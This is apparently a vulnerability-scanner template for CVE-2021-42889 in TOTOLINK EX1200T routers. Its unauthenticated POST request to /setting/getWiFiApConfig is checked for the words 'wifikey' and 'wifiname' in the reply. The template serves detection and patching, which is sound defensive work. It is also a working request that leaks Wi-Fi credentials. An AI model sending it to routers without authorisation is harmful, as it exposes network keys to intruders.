id: CVE-2021-42889

info:
  name: TOTOLINK EX1200T Sensitive Information Disclosure
  author: ProjectDiscoveryAI
  severity: high
  description: In TOTOLINK EX1200T V4.1.2cu.5215, an attacker can obtain sensitive information (wifikey, wifiname, etc.) without authorization.
  impact: |
    An attacker can access sensitive information stored on the router, leading to potential data leakage.
  remediation: |
    Apply the vendor-supplied patch or firmware update to mitigate CVE-2021-42889.
  reference:
    - https://github.com/p1Kk/vuln/blob/main/totolink_ex1200t_getWiFiApConfig_leak.md

http:
  - method: POST
    path:
      - "{{BaseURL}}/setting/getWiFiApConfig"

    body: '{"topicurl":"setting/getWiFiApConfig"}'

    headers:
      Content-Type: application/json
    matchers:
      - type: word
        words:
          - "wifikey"
          - "wifiname"
        part: body
        condition: and
